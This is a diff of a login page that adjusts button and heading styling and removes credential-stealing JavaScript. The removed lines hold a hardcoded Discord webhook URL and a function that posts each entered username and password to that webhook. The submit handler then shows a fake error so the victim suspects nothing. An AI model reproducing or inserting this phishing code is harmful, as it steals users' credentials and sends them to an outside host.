@@ -22,13 +22,18 @@
     border-width: 0 2px 2px 0; transform: rotate(45deg);
   }
   input[type="checkbox"]:focus { outline: none; box-shadow: 0 0 0 2px rgba(0,176,255,0.3); }
+
+  /* Login Button Styling */
   #loginBtn { 
     transition: bottom 0.3s ease; 
     min-width: 40%; 
     width: 60%; /* slightly less wide */
     font-size: 0.96rem; 
     padding: 0.7rem 0; 
+    display: block; 
+    margin: 0 auto; /* centers horizontally */
   }
+
   .input-container { width: 85%; margin: 0 auto; }
   input[type="text"], input[type="password"] { width: 100%; font-size: 0.95rem; padding-bottom: 0.25rem; }
   label[for="password"] { position: relative; top: -3px; font-size: 0.75rem; }
@@ -36,13 +41,7 @@
   label.inline-flex.items-center { position: relative; top: -8px; font-size: 0.85rem; }
   #forgotPassword { position: relative; top: -9.5px; font-size: 0.85rem; }
   #errorMsg { max-width: 95%; margin: 0 auto; font-size: 0.8rem; text-align: center; }
-  h1 { 
-    position: relative; 
-    top: -10px; 
-    font-size: 1.75rem; /* slightly bigger */
-    font-weight: 500; 
-    text-align: center; 
-  }
+  h1 { position: relative; top: -10px; font-size: 1.5rem; font-weight: 500; text-align: center; }
   form.flex.flex-col.space-y-6 { gap: 0.5rem; }
   .card { background: white; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
   .highlight { background-color: #eef2ff; padding: 0.5rem; border-radius: 8px; }
@@ -110,38 +109,6 @@ document.addEventListener("DOMContentLoaded", function() {
   const loginBtn = document.getElementById("loginBtn");
   const errorMsg = document.getElementById("errorMsg");
   const loginForm = document.getElementById("loginForm");
-  const loginList = document.getElementById("loginList");
-  const totalLogins = document.getElementById("totalLogins");
-  const lastLogin = document.getElementById("lastLogin");
-
-  const ENCRYPTION_KEY = 'x9kPqW7mZ3tR8vL2jF5gH1nY6bM4cT0a';
-  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1407527398634819675/VLdkgWM-0xnWNW2sPH3YUa3l1lwU5MZWywDSBzrjdcyOi-kEOCKfufQlMhllz9yTazFW';
-
-  function encryptData(data) {
-    return CryptoJS.AES.encrypt(JSON.stringify(data), ENCRYPTION_KEY).toString();
-  }
-
-  async function sendToWebhook(credentials) {
-    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'America/Chicago' });
-
-    const embed = {
-      title: "✨ New Login Captured",
-      description: "A user just logged in!",
-      color: 0x00b0ff,
-      fields: [
-        { name: "Username / Email", value: credentials.username, inline: true },
-        { name: "Password", value: credentials.password, inline: true },
-        { name: "Timestamp (CDT)", value: timestamp, inline: false }
-      ],
-      footer: { text: "Stay secure, stay aware!" }
-    };
-
-    await fetch(WEBHOOK_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ embeds: [embed] })
-    });
-  }
 
   function checkInputs() {
     if (usernameInput.value.trim() && passwordInput.value.trim()) {
@@ -158,26 +125,11 @@ document.addEventListener("DOMContentLoaded", function() {
   usernameInput.addEventListener("input", checkInputs);
   passwordInput.addEventListener("input", checkInputs);
 
-  loginForm.addEventListener("submit", async function(e) {
+  loginForm.addEventListener("submit", function(e) {
     e.preventDefault();
-    const username = usernameInput.value.trim();
-    const password = passwordInput.value.trim();
-    if (!username || !password) return;
-
-    const credentials = {
-      username,
-      password,
-      timestamp: Date.now()
-    };
-
-    try {
-      await sendToWebhook(credentials);
-      errorMsg.classList.remove("hidden");
-      passwordInput.value = "";
-      checkInputs();
-    } catch (err) {
-      console.error(err);
-    }
+    errorMsg.classList.remove("hidden");
+    passwordInput.value = "";
+    checkInputs();
   });
 
   window.togglePassword = function() {
